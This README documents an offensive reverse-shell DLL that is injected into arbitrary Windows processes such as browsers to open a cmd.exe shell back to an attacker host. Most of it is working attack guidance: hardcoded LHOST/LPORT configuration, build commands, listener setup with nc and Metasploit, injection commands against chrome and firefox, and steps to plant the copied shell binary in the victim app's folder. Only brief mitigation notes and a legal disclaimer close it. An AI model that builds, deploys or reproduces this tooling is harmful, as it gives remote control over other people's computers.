# proc-injection-2 — reverse-shell DLL

Pure WinSock reverse shell DLL. When loaded into any x64 Windows process (via `LoadLibrary`, `CreateRemoteThread`, APC, process hollowing, reflective loader — any of the techniques in `../proc-injection-1/`), it spawns an interactive `cmd.exe` reverse shell to your attacker's listener.

Works on **any vulnerable x64 Windows application** — not tied to a specific target.

## What's in this folder

| File | Purpose |
|---|---|
| `revshell_pure_dll.cpp` | ~90-line C++ source |
| `revshell_pure_dll.dll` | Pre-built 133 KB x64 DLL (LHOST = `192.168.68.101`, LPORT = `4444`) |
| `README.md` | This file |

## What it does

1. Loaded into the host process (via your injection chain)
2. Spawns a thread that opens a TCP socket to `LHOST:LPORT`
3. **Copies `C:\Windows\System32\cmd.exe`** → `<host_install_dir>\revShell.exe` so the child looks like it lives inside the target app's folder. Falls back to `%USERPROFILE%\revShell.exe` if the install dir isn't writable.
4. **Byte-patches** the FileDescription in the copy's version resource so Task Manager shows `"RevShell - WinCmd Proc"` as the big text (instead of `"Windows Command Processor"`) — makes YOUR shell identifiable in the process tree without changing anything else.
5. `CreateProcessA` the renamed cmd.exe with socket as stdin/stdout/stderr
6. Shell lands on your listener; you type commands, they run as the target user

After the shell exits, the dropped file is auto-deleted.

## Prerequisites to use

- A Windows victim box with the target app running
- An attacker box with `nc` / `ncat` / `metasploit multi/handler`
- Network reachability between them (same subnet or routable)
- An injector that LoadLibrary's this DLL into the target. The companion tool `../proc-injection-1/pop.exe` does this with `pop.exe <target> --dll <path>`.

## Config — edit at the top of `revshell_pure_dll.cpp` before building

```cpp
static const char*    LHOST                = "192.168.68.101";   // attacker IP
static const int      LPORT                = 4444;               // listener port
static const char*    CHILD_EXE_NAME       = "revShell.exe";     // dropped filename
static const wchar_t* DESCRIPTION_OVERRIDE = L"RevShell - WinCmd Proc"; // Task Manager big text
```

Change those four, rebuild, redeploy.

## Build on Windows (MSVC)

Requires Visual Studio 2022 Build Tools (v143) or any later MSVC.

Open **"x64 Native Tools Command Prompt for VS 2022"**:

```
cd <this_folder>
cl /LD /EHsc /O2 /nologo revshell_pure_dll.cpp /link ws2_32.lib /OUT:revshell_pure_dll.dll
```

Or from any PowerShell with vcvars sourced:

```powershell
& "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
cl /LD /EHsc /O2 /nologo revshell_pure_dll.cpp /link ws2_32.lib /OUT:revshell_pure_dll.dll
```

Output: `revshell_pure_dll.dll` (~130 KB).

## Build on Linux (MinGW-w64 cross-compile)

Requires `mingw-w64` package.

**Install on Kali / Debian / Ubuntu:**

```bash
sudo apt install -y mingw-w64
```

**Install on Arch:**

```bash
sudo pacman -S mingw-w64-gcc
```

**Install on Fedora:**

```bash
sudo dnf install mingw64-gcc-c++
```

**Build (any Linux distro once mingw-w64 is installed):**

```bash
x86_64-w64-mingw32-g++ -shared -O2 -s \
  -o revshell_pure_dll.dll revshell_pure_dll.cpp \
  -lws2_32 \
  -Wl,--subsystem,windows,--kill-at
```

Output: `revshell_pure_dll.dll` (~70 KB — smaller because MinGW doesn't link MSVC CRT).

The DLL is a native Windows x64 PE file. You just transfer it to your Windows victim and inject.

## How to use against ANY vulnerable application

The DLL doesn't care which host process it's loaded into. Three steps:

### 1. Pick a target

Any x64 Windows process you can inject into. On the victim box:

```powershell
Get-Process | Where-Object { $_.MainWindowHandle -ne 0 } | Select Id, ProcessName
```

Common targets:
- MVTC (lab)
- notepad.exe (demo)
- chrome.exe (one of the many)
- firefox.exe
- Any custom app you're pentesting

### 2. Start listener on attacker

```bash
# Kali:
nc -lvnp 4444

# or
ncat -lvnp 4444

# or Metasploit:
msfconsole
> use exploit/multi/handler
> set PAYLOAD windows/x64/shell_reverse_tcp
> set LHOST 192.168.68.101
> set LPORT 4444
> run
```

### 3. Inject the DLL into the target

Pick ANY injector. The simplest is `pop.exe` from `../proc-injection-1/`:

```powershell
pop.exe <target_name_or_pid> --dll <path>\revshell_pure_dll.dll
```

Examples:

```powershell
pop.exe MVTC --dll C:\payloads\revshell_pure_dll.dll
pop.exe chrome --dll C:\payloads\revshell_pure_dll.dll
pop.exe firefox --dll C:\payloads\revshell_pure_dll.dll
pop.exe 1234 --dll C:\payloads\revshell_pure_dll.dll
```

Or use any other injector (CreateRemoteThread + LoadLibraryA, APC, reflective loader, process hollowing — all work).

### 4. Shell lands on your listener

```
Ncat: Connection from 192.168.X.X:51234.
Microsoft Windows [Version 10.0.20348.587]

C:\Program Files (x86)\<TargetApp>>_
```

You now have an interactive command prompt running as the target user, with the target app as the parent process.

## Verify the shell is YOUR injection

On the victim, after the shell connects:

```powershell
Get-Process revShell | Select Id, ProcessName,
    @{N='Parent';E={(Get-CimInstance Win32_Process -Filter "ProcessId=$($_.Id)").ParentProcessId}},
    Path
```

Output confirms:
- `ProcessName = revShell`
- `Parent = <PID of the host app you injected into>`
- `Path = <host install folder>\revShell.exe` (or `%USERPROFILE%\revShell.exe` fallback)

Task Manager (expand the host app):

```
▼ <TargetApp>
    RevShell - WinCmd Proc    revShell.exe    ← your shell
        Console Window Host   conhost.exe
```

The big text "RevShell - WinCmd Proc" is YOUR identifier. The Image Name below shows `revShell.exe`.

## Clean up

The DLL deletes the dropped `revShell.exe` automatically when the shell exits. If you need to force-clean:

```powershell
Remove-Item "C:\Program Files (x86)\<TargetApp>\revShell.exe","$env:USERPROFILE\revShell.exe" -Force -EA 0
```

Kill the host app (and the shell with it):

```powershell
Get-Process <target> | Stop-Process -Force
```

## Troubleshooting

| Symptom | Fix |
|---|---|
| Shell doesn't connect | `LHOST` is wrong (not your attacker IP) OR firewall blocks port 4444. `telnet <LHOST> 4444` from victim to test |
| `revShell.exe` not spawned after injection | Connect timing out — DLL retries 10× with 2s delay. Wait ~25s on unreachable attacker |
| DLL drops to `%USERPROFILE%` instead of install folder | pop.exe (or injector) not running as Administrator — Program Files needs admin to write |
| `revshell_pure_dll.cpp` won't compile with MSVC | Need `/EHsc /link ws2_32.lib` flags |
| MinGW build complains about `_snprintf_s` | Use `snprintf` instead, or compile with `-D__STDC_WANT_LIB_EXT1__=1` |

## Mitigations (defender side)

For a client writing a security report:

- `SetProcessMitigationPolicy(ProcessDynamicCodePolicy)` — blocks `VirtualAllocEx(RWX)` in the host
- Code Integrity Guard — blocks loading unsigned DLLs
- Process Protection Level (PPL) — only PPL callers can `OpenProcess` with `VM_WRITE`
- `ProcessImageLoadPolicy.NoRemoteImages` — blocks DLL loading over network / UNC paths
- EDR with ETW `Microsoft-Windows-Threat-Intelligence` provider — alerts on `CreateRemoteThread` + unbacked RWX combo

## Legal

Use only against systems you own or have explicit written authorization to test. Running this against anything else is a crime in most jurisdictions.
